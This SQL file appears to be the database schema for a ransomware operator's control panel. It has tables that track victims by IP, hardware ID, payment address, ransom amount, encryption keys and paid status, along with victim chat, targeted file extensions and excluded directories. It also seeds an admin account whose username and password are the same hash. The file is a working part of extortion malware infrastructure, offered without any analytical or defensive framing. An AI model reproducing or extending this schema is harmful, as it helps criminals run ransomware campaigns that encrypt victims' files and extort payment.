CREATE TABLE IF NOT EXISTS `ransomware` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `ip` varchar(100) NOT NULL,
  `HWID` varchar(100) NOT NULL,
  `contactid` varchar(100) NOT NULL,
  `address` varchar(100) NOT NULL,
  `amount` varchar(100) NOT NULL,
  `day` time NOT NULL,
  `key` text NOT NULL,
  `public` text NOT NULL,
  `paid` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1  AUTO_INCREMENT=2;


CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1  AUTO_INCREMENT=2;

CREATE TABLE IF NOT EXISTS `chat`(
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `contactid` varchar(100) NOT NULL,
  `message` varchar(100) NOT NULL,
  `day` time NOT NULL,
  `admin` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=2;


CREATE TABLE IF NOT EXISTS `extensions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `active` varchar(100) NOT NULL,
  `extension` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1  AUTO_INCREMENT=2;


CREATE TABLE IF NOT EXISTS `blacklist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `directory` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1  AUTO_INCREMENT=2;


CREATE TABLE IF NOT EXISTS `debug` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `debug` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1  AUTO_INCREMENT=2;

INSERT INTO  `users` (`id` ,  `username` ,  `password` ) VALUES (1, '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918');
